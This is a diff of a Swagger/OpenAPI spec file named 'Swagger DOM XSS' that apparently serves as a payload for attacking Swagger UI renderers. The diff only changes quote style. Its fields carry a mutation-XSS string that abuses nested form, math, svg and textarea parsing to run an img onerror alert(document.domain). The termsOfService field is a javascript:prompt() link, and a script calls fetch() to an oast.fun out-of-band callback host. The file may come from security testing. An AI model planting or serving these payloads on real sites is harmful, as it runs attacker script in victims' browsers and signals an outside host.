@@ -1,7 +1,7 @@
 swagger: '2.0'
 info: 
   title: Swagger DOM XSS
-  description: <img src=https://raw.githubusercontent.com/Sachin-v3rma/random/main/fake.svg>XSS|
+  description: <img src="https://raw.githubusercontent.com/Sachin-v3rma/random/main/fake.svg">XSS|
     <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>
 
   termsOfService: "javascript:prompt()"
@@ -33,7 +33,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script>fetch("https://cemq4h22vtc0000pjwkgg8km1eoyyyyyb.oast.fun")</script>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><script>fetch('https://cemq4h22vtc0000pjwkgg8km1eoyyyyyb.oast.fun')</script>"></form>
 
           format: int64
           in: path
